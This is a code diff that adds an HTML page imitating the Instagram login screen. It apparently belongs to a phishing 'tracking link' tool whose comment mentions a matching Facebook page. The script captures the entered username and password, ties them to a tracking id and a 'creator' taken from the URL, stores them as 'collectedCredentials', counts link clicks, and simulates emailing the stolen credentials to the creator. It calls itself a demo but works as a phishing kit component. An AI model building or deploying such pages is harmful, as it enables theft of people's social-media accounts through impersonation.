@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: #fafafa;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .login-container {
+            max-width: 350px;
+            width: 100%;
+            padding: 20px;
+        }
+        
+        .login-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 30px 40px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        
+        .instagram-logo {
+            font-family: 'Billabong', cursive;
+            font-size: 48px;
+            margin-bottom: 20px;
+            color: #262626;
+        }
+        
+        .login-box input {
+            width: 100%;
+            padding: 9px 0 7px 8px;
+            margin-bottom: 6px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background: #fafafa;
+            font-size: 12px;
+        }
+        
+        .login-btn {
+            width: 100%;
+            background: #0095f6;
+            color: white;
+            border: none;
+            padding: 7px;
+            border-radius: 8px;
+            font-weight: 600;
+            margin: 15px 0;
+            cursor: pointer;
+        }
+        
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+        
+        .separator::before,
+        .separator::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+        
+        .separator::before {
+            margin-right: 10px;
+        }
+        
+        .separator::after {
+            margin-left: 10px;
+        }
+        
+        .facebook-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            margin: 15px 0;
+            cursor: pointer;
+        }
+        
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            margin: 15px 0;
+        }
+        
+        .signup-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .tracking-notice {
+            background: #fff8e1;
+            border: 1px solid #ffd54f;
+            padding: 8px;
+            border-radius: 3px;
+            margin-top: 15px;
+            font-size: 11px;
+            color: #e65100;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <div class="instagram-logo">Instagram</div>
+            
+            <input type="text" id="username" placeholder="Phone number, username, or email">
+            <input type="password" id="password" placeholder="Password">
+            
+            <button class="login-btn" onclick="handleLogin()">Log In</button>
+            
+            <div class="separator">OR</div>
+            
+            <div class="facebook-login">
+                📱 Log in with Facebook
+            </div>
+            
+            <div class="forgot-password">Forgot password?</div>
+            
+            <div class="tracking-notice" id="trackingNotice">
+                🔍 This is a tracking page
+            </div>
+        </div>
+        
+        <div class="signup-box">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+    </div>
+
+    <script>
+        // Same JavaScript as Facebook page (reuse functionality)
+        function getTrackingData() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return {
+                trackingId: urlParams.get('tracking'),
+                creator: urlParams.get('creator')
+            };
+        }
+
+        function handleLogin() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const trackingData = getTrackingData();
+            
+            if (!username || !password) {
+                alert('Please fill in all fields');
+                return;
+            }
+            
+            saveCredentials({
+                platform: 'instagram',
+                username: username,
+                password: password,
+                trackingId: trackingData.trackingId,
+                creator: trackingData.creator,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            });
+            
+            alert('Login information captured! This is a demo page.');
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+        }
+
+        function saveCredentials(credentials) {
+            const allCredentials = JSON.parse(localStorage.getItem('collectedCredentials') || '[]');
+            allCredentials.push(credentials);
+            localStorage.setItem('collectedCredentials', JSON.stringify(allCredentials));
+            updateLinkClickCount(credentials.trackingId);
+            simulateEmailNotification(credentials);
+        }
+
+        function updateLinkClickCount(trackingId) {
+            const links = JSON.parse(localStorage.getItem('trackingLinks') || '[]');
+            const linkIndex = links.findIndex(link => link.id === trackingId);
+            if (linkIndex !== -1) {
+                links[linkIndex].clicks = (links[linkIndex].clicks || 0) + 1;
+                localStorage.setItem('trackingLinks', JSON.stringify(links));
+            }
+        }
+
+        function simulateEmailNotification(credentials) {
+            console.log('Email to:', credentials.creator, 'Data:', credentials);
+            alert(`Instagram credentials sent to ${credentials.creator}`);
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const trackingData = getTrackingData();
+            if (trackingData.trackingId) {
+                document.getElementById('trackingNotice').textContent = 
+                    `🔍 Tracking Active - Data to: ${trackingData.creator}`;
+            }
+        });
+    </script>
+</body>
+</html>
